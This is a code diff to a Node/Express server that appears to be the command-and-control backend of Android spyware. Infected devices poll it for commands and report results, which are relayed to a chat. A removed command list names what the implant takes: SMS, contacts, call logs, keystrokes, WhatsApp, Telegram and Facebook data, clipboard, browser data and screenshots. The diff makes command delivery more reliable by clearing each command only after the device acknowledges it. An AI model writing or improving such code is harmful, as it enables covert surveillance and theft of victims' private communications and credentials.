@@ -1339,6 +1339,8 @@ app.get('/api/commands/:deviceId', (req, res) => {
     
     try {
         if (device?.pendingCommands?.length > 0) {
+            // Don't clear immediately - just return them
+            // They'll be cleared when the device acknowledges via /api/result
             const commands = device.pendingCommands.map(cmd => ({
                 command: cmd.command,
                 originalCommand: cmd.originalCommand,
@@ -1346,8 +1348,9 @@ app.get('/api/commands/:deviceId', (req, res) => {
                 timestamp: cmd.timestamp,
                 autoData: cmd.autoData || false
             }));
-            device.pendingCommands = [];
-            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
+            
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, 
+                       commands.map(c => c.command).join(', '));
             sendJsonResponse(res, { commands });
         } else {
             console.log(`📭 No commands for ${deviceId}`);
@@ -1363,23 +1366,18 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    // Consolidated commands that use file upload endpoints
-    const fileCommands = [
-        'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
-        'whatsapp', 'telegram', 'facebook', 'browser', 'clipboard', 'calendar',
-        'device_info', 'network_info', 'mobile_info', 'scan_all', 'scan_media',
-        'screenshots', 'screenshot_logs'
-    ];
-    
-    if (fileCommands.includes(command)) {
-        console.log(`📎 ${command} using dedicated file upload endpoint`);
-        return res.sendStatus(200);
-    }
-    
     console.log(`📨 Result from ${deviceId}:`, { command });
     
     const device = devices.get(deviceId);
-    if (device) {
+    if (device && device.pendingCommands) {
+        // Find and remove the executed command
+        const index = device.pendingCommands.findIndex(cmd => cmd.command === command);
+        if (index !== -1) {
+            const executedCmd = device.pendingCommands[index];
+            device.pendingCommands.splice(index, 1);
+            console.log(`✅ Command executed and removed: ${command} (autoData: ${executedCmd.autoData})`);
+        }
+        
         const chatId = device.chatId;
         const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
         
@@ -1394,6 +1392,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
     
     res.sendStatus(200);
 });
+
 
 // ============= REGISTRATION ENDPOINT =============
 app.post('/api/register', async (req, res) => {
